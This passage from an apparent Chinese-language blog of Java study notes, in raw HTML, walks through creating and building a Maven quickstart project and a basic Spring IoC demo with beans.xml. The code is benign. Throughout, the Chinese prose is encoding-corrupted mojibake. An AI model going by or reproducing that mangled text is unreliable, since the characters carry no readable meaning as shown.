src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/23.PNG" class="lazyload" data-srcset="23.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åç”¨å‘½ä»¤è¡Œæ„å»ºä¸€ä¸ªé¡¹ç›®ã€‚æ­¤å¤„æˆ‘å‘½å‘½ä¸ºmaven_learning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype:generate &quot;-DgroupId&#x3D;com.byc.test&quot; &quot;-DartifactId&#x3D;mvn_learning&quot; &quot;-DarchetypeArtifactId&#x3D;maven-archetype-quickstart&quot; &quot;-DinteractiveMode&#x3D;false&quot;</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨ideaä¸­å¯¼å…¥è¿™ä¸ªå·¥ç¨‹å³å¯ã€‚<br>ç›®å½•ç»“æ„<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>testè·Ÿjavaåˆ†åˆ«æ˜¯javaä»£ç æ–‡ä»¶è·Ÿæµ‹è¯•ä»£ç æ–‡ä»¶ã€‚éƒ½åœ¨åŒ…ç»“æ„ä¸‹ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬åˆå§‹çš„pom.xmlä¸­ä¸»è¦æ˜¯è¿™æ ·çš„å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯´æ˜Maven å·²ç»æ·»åŠ äº† JUnit ä½œä¸ºæµ‹è¯•æ¡†æ¶</p><p>åˆå§‹çš„App.javaæ˜¯ä¸€ä¸ªHello worldçš„ç”¨ä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.byc.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"Hello World!"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦build mavené¡¹ç›®ã€‚ä½¿ç”¨clean package</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure><p>æˆåŠŸåã€‚æˆ‘ä»¬ä¼šå‘ç°ç”Ÿæˆäº†targetæ–‡ä»¶å¤¹ã€‚å¹¶ä¸”å…¶ä¸­æœ‰æˆ‘ä»¬é¡¹ç›®æ„å»ºçš„jar fileã€‚<br>æ–°å¢ç›®å½•ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ç»™äº† maven ä¸¤ä¸ªç›®æ ‡ï¼Œé¦–å…ˆæ¸…ç†ç›®æ ‡ç›®å½•ï¼ˆcleanï¼‰ï¼Œç„¶åæ‰“åŒ…é¡¹ç›®æ„å»ºçš„è¾“å‡ºä¸º jarï¼ˆpackageï¼‰æ–‡ä»¶ã€‚</span><br><span class="line">æ‰“åŒ…å¥½çš„ jar æ–‡ä»¶å¯ä»¥åœ¨targetä¸­è·å¾—</span><br><span class="line">æµ‹è¯•æŠ¥å‘Šå­˜æ”¾åœ¨surefire-reportsæ–‡ä»¶å¤¹ä¸­</span><br><span class="line">Maven ç¼–è¯‘æºç æ–‡ä»¶ï¼Œä»¥åŠæµ‹è¯•æºç æ–‡ä»¶ã€‚</span><br><span class="line">æ¥ç€ Maven è¿è¡Œæµ‹è¯•ç”¨ä¾‹ã€‚</span><br><span class="line">æœ€å Maven åˆ›å»ºé¡¹ç›®åŒ…ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/25.PNG" class="lazyload" data-srcset="25.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>classesæ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨<code>java -cp . com.byc.test.App</code>å³å¯è°ƒç”¨Hello world.</p><p>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„mavené¡¹ç›®æ„å»ºè¿‡ç¨‹ã€‚å¦‚æœè¦ä½¿ç”¨å¤–éƒ¨ä¾èµ–è¿›è¡Œwebç›¸å…³å¼€å‘,åªéœ€ä¾ç…§ç›®å½•ç»“æ„è¿›è¡Œè¡¥å……å³å¯ã€‚å‡å¦‚æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªldapjdk.jarä½œä¸ºä¾èµ–ã€‚è¿˜æ˜¯è€æ ·å­å°†å…¶æ‹–åˆ°å·¥ç¨‹çš„libæ–‡ä»¶å¤¹ä¸‹,å¹¶åœ¨pom.xmlä¸­æ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- åœ¨è¿™é‡Œæ·»åŠ ä½ çš„ä¾èµ– --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  <span class="comment">&lt;!-- åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!--ç‰ˆæœ¬å·--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> <span class="comment">&lt;!--ä½œç”¨åŸŸ--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\lib\ldapjdk.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span> <span class="comment">&lt;!--é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸€å¼€å§‹æƒ³ç”¨ideabuild mavené¡¹ç›®æ—¶å‘ç°æŠ¥é”™ã€‚æŸ¥äº†ä¸‹å‘ç°å¯èƒ½æ˜¯è‡ªå·±jdkç‰ˆæœ¬è·Ÿideaçš„ä¸ä¸€è‡´çš„åŸå› ã€‚(ä¸ºäº†burpä½¿ç”¨jdk1.8,ä½†æœ€æ—©å­¦ç¼–ç¨‹æ—¶ç”¨çš„jdk10)æ‰€ä»¥æœ€å¥½ä¿è¯mavenç”Ÿæˆæ„å»ºé¡¹ç›®æ—¶çš„ä¸€è‡´æ€§<br>(åšhtbæŸé¶æœºä¸­é‡åˆ°äº†maven buildå¤±è´¥çš„æƒ…å†µ,æœ€åè§£å†³åŠæ³•æ˜¯åœ¨æ›´æ”¹äº†è¯­è¨€levelååŒæ—¶è¿˜åœ¨pom.xmlä¸­åŠ å…¥mavenç‰ˆæœ¬,jdkç‰ˆæœ¬æ‰å®Œç¾è§£å†³)</p><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>emmæ²¡é”™åˆä»mavenè·³åˆ°springäº†ã€‚å¤§æ¦‚æ˜¯å› ä¸ºspringæ¡†æ¶å‡ºç°çš„é¢‘ç‡è¿˜æ˜¯ç®—æ¯”è¾ƒé«˜çš„ã€‚å¹¶ä¸”è¿˜ä¸èƒ½ç®€å•çš„æŒ‰ç…§servletå¼€å‘çš„æµç¨‹ç†è§£ã€‚æ‰€ä»¥å…ˆå­¦ä¹ ä¸‹springçš„åŸºç¡€çŸ¥è¯†ã€‚</p><ul><li>what is spring</li></ul><p>è½»é‡çº§çš„Java Webå¼€å‘æ¡†æ¶ï¼Œä»¥IOC,AOPä¸ºå†…æ ¸ï¼Œä½¿ç”¨åŸºæœ¬çš„JavaBeanå®Œæˆä»¥å‰åªå¯èƒ½ç”±EJBå®Œæˆçš„å·¥ä½œï¼Œå–ä»£äº†EJBè‡ƒè‚¿å’Œä½æ•ˆçš„å¼€å‘æ¨¡å¼ã€‚</p><p>springæ¡†æ¶é‡‡ç”¨åˆ†å±‚ç»“æ„ã€‚å¯åˆ†ä¸ºData Access/Integrationã€Webã€AOPã€Aspectsã€Messagingã€Instrumentationã€Core Containerå’ŒTestã€‚</p><p>å…¶ä¸­core container æ ¸å¿ƒå®¹å™¨åŒ…å«å‡ ä¸ªæ¨¡å—</p><blockquote><p>Coreæ¨¡å—ï¼šæä¾›äº†æ¡†æ¶çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼ŒåŒ…æ‹¬IoCå’Œä¾èµ–æ³¨å…¥åŠŸèƒ½ï¼›<br>Beansæ¨¡å— ï¼šæä¾›BeanFactoryï¼Œæ˜¯å·¥å‚æ¨¡å¼çš„ç»å…¸å®ç°ï¼ŒSpringå°†ç®¡ç†å¯¹è±¡ç§°ä¸ºBeanï¼›<br>Contextæ¨¡å—ï¼šæ˜¯åœ¨Coreå’ŒBeansæ¨¡å—çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œä»¥ä¸€ç§ç±»ä¼¼äºJNDIæ³¨å†Œçš„æ–¹å¼è®¿é—®å¯¹è±¡ï¼Œæ˜¯è®¿é—®å®šä¹‰å’Œé…ç½®ä»»ä½•å¯¹è±¡çš„åª’ä»‹ã€‚ApplicationContextæ¥å£æ˜¯ä¸Šä¸‹æ–‡æ¨¡å—çš„ç„¦ç‚¹ï¼›<br>SpELæ¨¡å—ï¼šæä¾›äº†å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼›</p></blockquote><p>å…¶ä»–å¦‚Data Access/Integration åŒ…å«jdbï¼Œormç­‰æ¨¡å—ã€‚WebåŒ…å«Servlet,MVCç­‰æ¨¡å—ã€‚æš‚ä¸”ä¸æã€‚</p><p>ä¸‹é¢è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„æµç¨‹å…ˆåšä¸€ä¸ªç®€å•çš„spring demoã€‚åˆ›å»ºspringé¡¹ç›®å¾ˆç®€å•ã€‚ideaä¸­åˆ›å»ºé¡¹ç›®é‡Œé€‰æ‹©springåä¸‹é¢é€‰æ‹©downloadé€‰é¡¹è‡ªåŠ¨ä¸‹è½½ä¾èµ–ã€‚ä¹‹åå°±ä¼šå‘ç°ä¾èµ–åŒ…å·²ç»åœ¨libæ–‡ä»¶å¤¹ä¸‹äº†ã€‚</p><p>é¦–å…ˆsrcä¸‹å»ºåŒ…top.bycsecã€‚æ–°å»ºä¸¤ä¸ªç±»</p><p>HelloWorld</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Your Message : "</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"beans.xml"</span>);</span><br><span class="line">        HelloWorld obj = (HelloWorld) context.getBean(<span class="string">"helloWorld"</span>);</span><br><span class="line">        obj.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¡†æ¶çš„ClassPathXmlApplicationContext()å‡½æ•°æ¥åˆ›å»ºåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªAPIåŠ è½½beansçš„é…ç½®æ–‡ä»¶å¹¶æœ€ç»ˆåŸºäºæ‰€æä¾›çš„APIï¼Œå®ƒå¤„ç†åˆ›å»ºå¹¶åˆå§‹åŒ–æ‰€æœ‰çš„å¯¹è±¡ï¼Œå³åœ¨é…ç½®æ–‡ä»¶ä¸­æåˆ°çš„beans</p><p>åŒæ—¶ä½¿ç”¨å·²åˆ›å»ºçš„ä¸Šä¸‹æ–‡çš„getBean()æ–¹æ³•æ¥è·å¾—æ‰€éœ€çš„beanã€‚è¿™ä¸ªæ–¹æ³•ä½¿ç”¨beançš„IDè¿”å›ä¸€ä¸ªæœ€ç»ˆå¯ä»¥è½¬æ¢ä¸ºå®é™…å¯¹è±¡çš„é€šç”¨å¯¹è±¡ã€‚ä¸€æ—¦æœ‰äº†å¯¹è±¡ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡è°ƒç”¨ä»»ä½•ç±»çš„æ–¹æ³•ï¼›</p><p>é‚£ä¹ˆè‡ªç„¶ã€‚æˆ‘ä»¬é€‰æ‹©åŠ è½½äº†beans.xmlçš„é…ç½®ã€‚æ‰€ä»¥éœ€è¦é…ç½®beans.xmlã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.HelloWorld"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„bean çš„idè‡ªå®šã€‚ä½†æ˜¯å¿…é¡»å’Œè·å–beanæ—¶ä½¿ç”¨getBean()çš„å‚æ•°ä¿æŒä¸€è‡´ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å°±springé‡Œçš„å‡ ä¸ªåŸºç¡€æœ¯è¯­å­¦ä¹ ä¸‹</p><ul><li>IOC</li></ul><p>IOC å³ Inversion of Control ,æ§åˆ¶åè½¬ã€‚æŒ‡åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œå®ä¾‹çš„åˆ›å»ºä¸å†ç”±è°ƒç”¨è€…ç®¡ç†ï¼Œè€Œæ˜¯ç”±Springå®¹å™¨åˆ›å»ºã€‚Springå®¹å™¨ä¼šè´Ÿè´£æ§åˆ¶ç¨‹åºä¹‹é—´çš„å…³ç³»ï¼Œè€Œä¸æ˜¯ç”±ç¨‹åºä»£ç ç›´æ¥æ§åˆ¶ï¼Œå› æ­¤æ§åˆ¶æƒç”±ç¨‹åºä»£ç è½¬ç§»åˆ°äº†Springå®¹å™¨ä¸­ï¼Œæ§åˆ¶æƒå‘ç”Ÿäº†åè½¬ï¼Œè¿™å°±æ˜¯Springçš„IoCæ€æƒ³</p><p>Springå®¹å™¨ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ¥ç®¡ç†ç»„æˆä¸€ä¸ªåº”ç”¨ç¨‹åºçš„ç»„ä»¶ã€‚è¿™äº›å¯¹è±¡è¢«ç§°ä¸ºSpring Beansã€‚</p><p>å³,IoCå®¹å™¨æ˜¯ä¸€ä¸ªå…·æœ‰ä¾èµ–æ³¨å…¥åŠŸèƒ½çš„å®¹å™¨ï¼Œå®ƒå¯ä»¥åˆ›å»ºå¯¹è±¡ï¼ŒIoCå®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´çš„ä¾èµ–ã€‚</p><p>IOCå®¹å™¨çš„ä½¿ç”¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸ºäº†è§£å†³å¼€å‘è¿‡ç¨‹ä¸­,å‡ºç°ä¸€ä¸ªç³»ç»Ÿæœ‰å¤§é‡çš„ç»„ä»¶ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå’Œç›¸äº’ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœç”±ç»„ä»¶è‡ªèº«æ¥ç»´æŠ¤ï¼Œä¸ä½†å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè€Œä¸”ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´æä¸ºç´§å¯†çš„è€¦åˆï¼Œç»§è€Œç»™æµ‹è¯•å’Œç»´æŠ¤å¸¦æ¥äº†æå¤§çš„å›°éš¾ã€‚å› æ­¤ä½¿ç”¨äº†IOCã€‚</p><p>åŒæ—¶ã€‚æ§åˆ¶åè½¬è¿™ä¸ªæ¦‚å¿µæ„å‘³ç€åº”ç”¨ç¨‹åºåªéœ€ä½¿ç”¨å·²ç»é…ç½®å¥½çš„ç»„ä»¶ï¼Œé‚£ä¹ˆâ€ä¾èµ–æ³¨å…¥â€è¿™ä¸ªæ¦‚å¿µå°±éšä¹‹è€Œå‡ºäº†ã€‚æˆ‘ä»¬ä¸æ˜¯newä¸€ä¸ªå¯¹è±¡ã€‚è€Œæ˜¯æ³¨å…¥å®ƒåˆ°å…¶ä»–ç»„ä»¶ä¸­ã€‚è¿™æ ·æˆ‘ä»¬èŠ‚çœäº†ç¼–å†™é…ç½®ä»£ç çš„æ—¶é—´ã€‚åŒæ—¶æ³¨å…¥ä¹Ÿæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç»„ä»¶æ³¨å…¥åˆ°å…¶ä»–ç±»ä¸­ã€‚ä½“ç°äº†ç»„ä»¶å…±äº«çš„ç®€å•ã€‚</p><p>ä¹Ÿæ­£å› å¦‚æ­¤ã€‚æˆ‘ä»¬è¦è®©IOCå®¹å™¨çŸ¥é“æ€æ ·é…ç½®ç»„ä»¶ã€‚æ‰€ä»¥æ‰æœ‰äº†ä¸Šé¢çš„ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„é…ç½®è¿™ä¸€åšæ³•ã€‚</p><p>springæä¾›äº†ä¸¤ç§IOCå®¹å™¨ã€‚ä¸€ç§æ˜¯æˆ‘ä»¬ç”¨è¿‡äº†çš„<code>ApplicationContext</code>.è¿˜æœ‰ä¸€ç§æ˜¯æ¯”è¾ƒè½»é‡çš„<code>BeanFactory</code>.</p><blockquote><p>äºŒè€…çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå¦‚æœBeançš„æŸä¸€ä¸ªå±æ€§æ²¡æœ‰æ³¨å…¥ï¼Œåˆ™ä½¿ç”¨BeanFacotryåŠ è½½åï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨getBean()æ–¹æ³•æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€ŒApplicationContextåˆ™åœ¨åˆå§‹åŒ–æ—¶è‡ªæ£€ï¼Œè¿™æ ·æœ‰åˆ©äºæ£€æŸ¥æ‰€ä¾èµ–çš„å±æ€§æ˜¯å¦æ³¨å…¥ã€‚å› æ­¤ï¼Œåœ¨å®é™…å¼€å‘ä¸­ï¼Œé€šå¸¸éƒ½é€‰æ‹©ä½¿ç”¨ApplicationContextï¼Œè€Œåªæœ‰åœ¨ç³»ç»Ÿèµ„æºè¾ƒå°‘æ—¶æ‰è€ƒè™‘ä½¿ç”¨BeanFactoryã€‚</p></blockquote><p>å…·ä½“ç”¨æ³•è·Ÿä¸Šé¢çš„demoæ²¡æœ‰åŒºåˆ«ã€‚åªæ˜¯å®ä¾‹åŒ–ç±»çš„åŒºåˆ«ã€‚å› æ­¤ä¸å†æåŠã€‚</p><p>å¦‚æœè¦æŠŠä¸Šé¢çš„æµç¨‹å†ä»”ç»†åˆ†æä¸‹çš„è¯ã€‚å…¶å®ç¬¬ä¸€å¥<code>ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);</code>æ˜¯åŠ è½½äº†beançš„é…ç½®æ–‡ä»¶ã€‚å¹¶ä¸”åˆå§‹åŒ–å¥½å¯¹è±¡ã€‚ç¬¬äºŒå¥åˆ™ä½¿ç”¨<code>getBean()</code>è¿™ä¸ªæ–¹æ³•é€šè¿‡é…ç½®æ–‡ä»¶ä¸­çš„ beanidè¿”å›çœŸæ­£çš„å¯¹è±¡å¹¶ä½¿ç”¨å…¶è°ƒç”¨ä»»ä½•æ–¹æ³•ã€‚</p><ul><li>bean</li></ul><p>Beanæ˜¯ä¸€ä¸ªè¢«å®ä¾‹åŒ–ã€ç»„è£…ã€å¹¶é€šè¿‡Spring IoCå®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ã€‚è¿™äº›Beanæ˜¯ç”±ç”¨å®¹å™¨æä¾›çš„é…ç½®å…ƒæ•°æ®åˆ›å»ºçš„ï¼Œä¾‹å¦‚å‰é¢çœ‹åˆ°çš„åœ¨XMLçš„è¡¨å•ä¸­çš„å®šä¹‰ã€‚</p><p>demoä¸­å‡ºç°çš„å‡ ä¸ªbeançš„å…ƒç´ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id æ˜¯ä¸€ä¸ª Bean çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒSpring å®¹å™¨å¯¹ Bean çš„é…ç½®å’Œç®¡ç†éƒ½é€šè¿‡è¯¥å±æ€§å®Œæˆ</span><br><span class="line">class è¯¥å±æ€§æŒ‡å®šäº† Bean çš„å…·ä½“å®ç°ç±»ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç±»åï¼Œä½¿ç”¨ç±»çš„å…¨é™å®šå</span><br><span class="line">property &lt;bean&gt;å…ƒç´ çš„å­å…ƒç´ ï¼Œç”¨äºè°ƒç”¨ Bean å®ä¾‹ä¸­çš„ Set æ–¹æ³•å®Œæˆå±æ€§èµ‹å€¼ï¼Œä»è€Œå®Œæˆä¾èµ–æ³¨å…¥ã€‚è¯¥å…ƒç´ çš„ name å±æ€§æŒ‡å®š Bean å®ä¾‹ä¸­çš„ç›¸åº”å±æ€§å</span><br></pre></td></tr></table></figure><p>å› æ­¤ä¸Šé¢beançš„xmlé…ç½®å…¶å®æ˜¯åšäº†è¿™æ ·çš„æ³¨å…¥çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 